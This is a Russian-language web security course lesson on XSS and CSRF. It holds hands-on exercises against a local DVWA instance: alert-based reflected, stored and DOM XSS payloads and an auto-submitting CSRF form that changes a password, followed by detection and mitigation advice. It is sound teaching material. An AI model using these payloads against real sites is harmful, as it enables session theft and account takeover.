# 8.2 — XSS и CSRF

> **M08 · Этап 1 · 4 ч · 🟡 · артефакт:** `labs/m08-web-api/l02-xss/`

## Цель

Понять, как JavaScript исполняется в чужом контексте и как заставить браузер жертвы выполнить действие без её ведома.

## Результат

- Reflected, stored и DOM XSS в DVWA.
- CSRF-страница, меняющая пароль.
- Понимание CSP, `HttpOnly`, `SameSite`.

## Теория

- XSS = ввод попадает в HTML/JS без контекстного экранирования.
- Reflected — payload в ответе на запрос; stored — сохраняется; DOM — JS сам вставляет данные.
- `HttpOnly` защищает cookie от чтения, но не от действий от имени пользователя.
- CSP ограничивает источники скриптов; `unsafe-inline` убивает защиту.
- CSRF = браузер автоматически отправляет cookie; защита — токен, `SameSite`, проверка `Origin`.
- CSRF и XSS связаны: XSS может прочитать токен, если он в DOM.

## Лаборатория

### 1. Reflected

DVWA → XSS Reflected:

```html
<script>alert(document.cookie)</script>
```

Ожидаемо: alert с `PHPSESSID`. Если `HttpOnly` включён — cookie не покажется, но JS всё равно исполнится.

### 2. Stored

DVWA → XSS Stored (guestbook):

```html
<script>alert('stored')</script>
```

Ожидаемо: alert при каждом открытии страницы. Это уже persistent-проблема.

### 3. DOM

Страница, где JS берёт `location.hash` и пишет в `innerHTML`. Проверьте:

```
#<img src=x onerror=alert(1)>
```

Ожидаемо: alert. Сервер вообще не видел payload — защита должна быть в JS.

### 4. CSRF

DVWA → CSRF. В Burp посмотрите запрос смены пароля: токена нет.

Создайте `csrf.html`:

```html
<html><body onload="document.forms[0].submit()">
<form action="http://127.0.0.1:8080/vulnerabilities/csrf/" method="GET">
  <input name="password_new" value="Hacked123!">
  <input name="password_conf" value="Hacked123!">
  <input type="submit">
</form>
</body></html>
```

Откройте в браузере, где вы залогинены. Ожидаемо: пароль изменён.

### 5. CSP

Посмотрите заголовок:

```bash
curl -s -D - -o /dev/null http://127.0.0.1:8080/ | grep -i content-security
```

Ожидаемо: скорее всего, заголовка нет. Сформулируйте, какой CSP заблокировал бы inline-скрипт.

## Атака и защита

- **Атака:** кража сессии, действия от имени пользователя, фишинг внутри страницы, keylogging.
- **Детект:** WAF, аномальные `<script>`, CSP-репорты, DOM-мутации.
- **Фикс:** контекстное экранирование, CSP без `unsafe-inline`, `HttpOnly`+`Secure`+`SameSite`, CSRF-токены, проверка `Origin`.

## Самопроверка

- [ ] Чем DOM XSS отличается от reflected?
- [ ] Почему `HttpOnly` не спасает от CSRF?
- [ ] Что делает `SameSite=Lax`?
- [ ] Как CSP ломает inline-payload?

## Дальше

[8.3 — SSRF, XXE, LFI, upload](l03-ssrf-xxe-lfi.md)
